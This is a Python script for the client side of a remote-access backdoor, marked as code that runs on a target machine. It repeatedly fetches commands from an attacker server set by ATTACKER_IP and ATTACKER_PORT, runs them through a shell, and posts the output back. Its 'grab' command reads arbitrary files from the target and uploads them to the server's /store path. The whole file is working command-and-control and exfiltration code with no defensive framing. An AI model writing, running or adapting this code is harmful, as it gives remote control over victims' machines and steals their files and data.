#Client ---> runs on target

from urllib import request, parse
import subprocess
import time
import os

ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
ATTACKER_PORT = 8080

# Data is a dict
def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}'):
    data = {"rfile": data}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    request.urlopen(req) # send request


def send_file(command):
    try:
        grab, path = command.strip().split(' ')
    except ValueError:
        send_post("[-] Invalid grab command (maybe multiple spaces)")
        return

    if not os.path.exists(path):
        send_post("[-] Not able to find the file")
        return

    store_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
    with open(path, 'rb') as fp:
        send_post(fp.read(), url=store_url)


def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read())
    send_post(CMD.stderr.read())


while True:
    command = request.urlopen(f"http://{ATTACKER_IP}:{ATTACKER_PORT}").read().decode()

    if 'terminate' in command:
        break

    # Send file
    if 'grab' in command:
        send_file(command)
        continue

    run_command(command)
    time.sleep(1)
